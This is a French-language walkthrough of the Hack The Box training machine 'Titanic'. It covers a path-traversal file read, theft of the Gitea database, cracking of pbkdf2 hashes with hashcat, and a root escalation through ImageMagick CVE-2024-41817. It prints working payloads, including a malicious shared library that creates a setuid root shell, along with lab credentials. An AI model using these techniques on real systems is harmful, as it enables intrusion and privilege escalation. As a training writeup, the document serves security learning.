---
title: Titanic
description: Nooo don't turn 25 you're so cute haha
tags:
  - HTB
  - machine
  - pbkdf2
  - sql
  - magick
  - cron
date: 2026-04-14T11:26
tasks:
  - format
parent file:
  - "[[HTB MOC]]"
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "7"
seasonal: yes
---

# Outline
## Foothold
- Le site principal présente une LFI.
- Le sous-domaine `dev.titanic.htb` présente plusieurs repo gitea `developer` avec des infos:
	- La configuration docker de la base de données, avec les identifiants.
	- Les fichiers python du site gitea avec l'emplacement du `root`.
- Le premier site permet de lire le fichier de configuration et trouver l'emplacement de la db.
- A nouveau la LFI permet d'exfiltrer la db et les identifiants récupérés précédemment de s'y connecter pour lire les hash de mots de passe.
- Les hashs de mots de passe sont stockés en pbkdf2, après une manip rapide on peut les cracker facilement.
- Cela nous donne accès à `developer`, dont on avait déjà croisé le nom et le travail avant.
## PrivEsc to root
- Certains dossiers sont modifiables par nous, notamment un dossier dans lequel est exécuté un script.
- Ce script fait appel à une version vulnérable de magick dont [CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) permet d'en abuser et donne l'accès root.

# Foothold

Les ports ouverts sont les classiques: `80` et `22`.

Le site est très simple en soi.
![[Pasted image 20260414114104.png]]

Il permet notamment de s'inscrire pour la croisière:
![[Pasted image 20260414114233.png]]

Et ensuite un lien est envoyé pour télécharger le fichier avec notre ticket `/download?ticket=7aaaab96-e010-4386-b863-f3dbe1c494a9.json`. En changeant cette valeur il est possible de télécharger le fichier que l'on souhaite:
```
/download?ticket=../../../etc/passwd
```
![[Pasted image 20260414114355.png]]

Cette vulnérabilite est un path traversal doublé d'une local file inclusion, cela nous permet de lire les fichiers du système.

Avec cela il est possible de savoir que `developer` est utilisateur avec un `/home`.

Pour ceux qui auraient loupé le sous-domaine `dev.titanic.htb`. La page principale ne montre pas grand chose, elle permet de s'inscrire et se login. Elle montre aussi la version du site, `1.22.1`, qui s'avère finalement inutile (seule une XSS est possible).

Une fois inscrit sur le site, n'importe qui a accès aux repos de `developer`, qui contiennent des identifiants:
```
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```
Ainsi qu'un fichier de configuration gitea:
```
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```
Et pour couronner le tout le code de l'application flask
```
from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

TICKETS_DIR = "tickets"

if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

Dans le dossier de tickets deux tickets sont déjà créés, ce qui permet de récupérer des identifiants:
```
{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
```
et
```
{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
```

Les identifiants donnés jusqu'à maintenant:
- `jack.dawson@titanic.htb`
- `rose.bukater@titanic.htb`
- `developer:developer@titanic.htb`
- identifiants sql `root:MySQLP@$$w0rd!@tickets`
```
mysql -u root -pMySQLP@$$w0rd! -h localhost tickets -e "select * from users;" -E
```
- chemin de base de gitea
```
/home/developer/gitea/data
```

A partir de ces infos il est possible aussi de lire le fichier `/home/developer/gitea/data/gitea/conf/app.ini` pour y trouver quelques infos.
```
[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

Cette fois le fichier de configuration donne un indice sur la base de données, qu'il est possible de télécharger avec
```
wget http://titanic.htb/download\?ticket\=../../../home/developer/gitea/data/gitea/gitea.db -O gitea.db
```

Puis de lire dans sqlite3:
```
select * from user;
```
Pour obtenir.
```
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0

2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0

3|guest|guest||email@email.com|0|enabled|76c0dfd39edbfb2111be60b71c7c33d645ed7a3b7295fb04357a60398b2d24a8860930be4bd89e9a032a50b8a0710d971184|pbkdf2$50000$50|0|0|0||0|||5e356ef176a4f33f118fa89d6c208b31|f6211670b5b38f54119066257b18f799|en-US||1776171040|1776171040|1776171040|0|-1|1|0|0|0|0|1|0|4f64c9f81bb0d4ee969aaf7b4a5a6f40|email@email.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

Il est possible de récupérer l'ordre de ces infos dans la base de données avec
```
.schema user
```
Avec ça il est possible de trouver les hash et les salt:
```
echo "developer:sha256:50000:$(echo -n '8bf3e3452b78544f8bee9400d6936d34' | xxd -r -p | base64):$(echo -n 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56' | xxd -r -p | base64)" > hashes.txt
hashcat -a 0 -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt --username
```
(Il faut commencer avec `developer` ici, qui a l'air plus intéressant)

Tout cela nous donne les identifiants `developer:25282528`, et ainsi l'accès ssh.
![[Pasted image 20260414172351.png]]

# PrivEsc to root

linpeas remarque automatiquement deux dossiers dans lesquels on peut écrire:
```
/opt/app/static/assets/images
/opt/app/tickets
```
Et dans la partie des fichiers ajoutés par l'utilisateur, linpeas soulève
```
/opt/scripts/identify_images.sh
```
Fichier qui contient le code suivant:
```
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Le fichier `metadata.log` a d'ailleurs été modifié récemment, la dernière fois que l'on a interagit avec le site précisemment.

Le script en lui-même n'est pas vulnérable en entier, il utilise magick dans une version qui est vulnérable à [CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) qui consiste à poser une librairie partagée dans le dossier d'exécution, dossier sur lequel on a des droits privilégiés.

```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/rootshell; chmod 7777 /tmp/rootshell");
    exit(0);
}
EOF
```

Et avec ça compilé dès le lancement du cron le shell sera créé et accessible.

![[Pasted image 20260414185240.png]]

![[Pasted image 20260414185310.png]]

